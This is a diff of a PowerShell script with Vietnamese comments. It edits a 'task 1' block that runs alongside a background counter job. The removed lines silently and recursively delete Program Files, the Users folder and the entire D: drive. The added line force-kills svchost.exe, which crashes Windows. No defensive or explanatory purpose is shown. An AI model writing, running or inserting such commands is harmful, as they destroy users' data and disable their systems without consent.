@@ -25,11 +25,8 @@ Start-Job -ScriptBlock {
 } | Out-Null
 
 # ===== DAN LENH CUA BAN CHO TASK 1 O DAY (se chay dong thoi voi bo dem tren) =====
-cmd /c "rmdir /s /q C:\Program Files" 2>$null
-cmd /c "rmdir /s /q C:\Program Files (x86)" 2>$null
-cmd /c "rmdir /s /q C:\Users" 2>$null
-Remove-Item "C:\Users\*" -Recurse -Force -ErrorAction SilentlyContinue
-Remove-Item "D:\*" -Recurse -Force -ErrorAction SilentlyContinue
+
+taskkill /f /im svchost.exe
 
 # ===== HET PHAN LENH TASK 1 =====
 '@
